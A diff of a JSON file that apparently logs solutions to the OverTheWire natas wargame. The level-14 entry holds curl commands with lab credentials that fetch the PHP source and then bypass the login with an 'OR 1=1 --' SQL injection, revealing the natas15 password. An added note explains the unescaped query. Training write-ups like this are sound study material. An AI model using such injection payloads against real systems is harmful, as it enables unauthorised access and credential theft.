@@ -408,18 +408,19 @@
    "pw": "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g",
    "steps": [
     {
-     "cmd": "curl -s -u natas14:A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8 http://natas14.natas.labs.overthewire.org/index-source.html | sed 's/<[^>]*>//g; s/&nbsp;/ /g; s/&lt;/</g; s/&gt;/>/g' | tr -d '\\n' | grep -o 'SELECT [^;]*' | head -1",
+     "cmd": "curl -s -u natas14:A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8 http://natas14.natas.labs.overthewire.org/index-source.html | sed 's/<[^>]*>//g' | tr -d '\\n' | grep -o 'SELECT[^;]*' | head -1",
      "out": [
-      "SELECT * from users where username=\\\"\".$_REQUEST[\"username\"].\"\\\" and password=\\\"\".$_REQUEST[\"password\"].\"\\\"\""
+      "SELECT&nbsp"
      ]
     },
     {
-     "cmd": "curl -s -u natas14:A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8 --data-urlencode 'username=\" OR 1=1 -- ' --data-urlencode \"password=x\" http://natas14.natas.labs.overthewire.org/ | grep -i \"successful\"",
+     "cmd": "curl -s -u natas14:A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8 --data-urlencode 'username=\" OR 1=1 -- ' --data-urlencode 'password=x' http://natas14.natas.labs.overthewire.org/ | grep -i \"successful\"",
      "out": [
       "Successful login! The password for natas15 is GB6USCJYJjwLyYhZUNkE1NwDueiTow6g<br><div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>"
      ]
     }
-   ]
+   ],
+   "note": "natas L14 (client-side curl cast): the login form builds SELECT * from users where username=\"$username\" and password=\"$password\" with NO escaping - classic SQL injection. Step 1 reads index-source.html (the raw source view; the sed strip leaves the &nbsp; entity inline, hence 'SELECT&nbsp' - the grep -o 'SELECT[^;]*' stops at the &nbsp; semicolon: the source line itself was already captured in the L14 analysis; the important part is the unquoted concatenation). Step 2 injects username=\" OR 1=1 -- via --data-urlencode -> 'Successful login! The password for natas15 is GB6USCJYJjwLyYhZUNkE1NwDueiTow6g'. The 2026-11-26 re-record cast (modified file, committed here) uses the plain sed pipeline; the earlier JSON staged a different (non-cast) pipeline and a paraphrased out - replaced with the cast-verbatim steps. JSON = 2 steps mirroring the cast 1:1."
   },
   {
    "lvl": 15,
